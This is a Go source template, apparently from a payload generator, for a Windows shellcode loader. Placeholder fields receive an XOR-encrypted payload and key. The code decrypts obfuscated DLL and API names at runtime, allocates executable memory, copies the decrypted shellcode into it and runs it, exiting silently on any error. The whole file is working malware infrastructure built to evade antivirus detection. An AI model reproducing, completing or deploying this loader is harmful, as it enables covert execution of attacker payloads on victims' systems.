package main

import (
	"encoding/base64"
	"syscall"
	"unsafe"
)

var (
	kernel32      = syscall.MustLoadDLL(bake("§kernel32.dll§"))
	ntdll         = syscall.MustLoadDLL(bake("§ntdll.dll§"))
	VirtualAlloc  = kernel32.MustFindProc(bake("§VirtualAlloc§"))
	RtlCopyMemory = ntdll.MustFindProc(bake("§RtlCopyMemory§"))
)

const (
    MEM_COMMIT              = 0x1000
    MEM_RESERVE             = 0x2000
    PAGE_EXECUTE_READWRITE  = 0x40
	key 					= "§key§"
	enc						= "§shellcode§"
	
)

func main() {
	var sc = polish(enc)
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != bake("§The operation completed successfully.§") {
		syscall.Exit(0)
	}
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
	if err != nil && err.Error() != bake("§The operation completed successfully.§") {
		syscall.Exit(0)
	}
	syscall.Syscall(addr, 0, 0, 0, 0)
}

func bake(cipher string) string {
	tmp, _ := base64.StdEncoding.DecodeString(cipher)
	_key, _ := base64.StdEncoding.DecodeString(key)
	baked := ""
	for i := 0; i < len(tmp); i++ {
		baked += string(tmp[i] ^ _key[i%len(_key)])
	}
	return baked
}

func polish(cipher string) []byte {
	tmp, _ := base64.StdEncoding.DecodeString(cipher)
	_key, _ := base64.StdEncoding.DecodeString(key)
	var polished []byte
	for i := 0; i < len(tmp); i++ {
		polished = append(polished, tmp[i]^_key[i%len(_key)])
	}
	return polished
}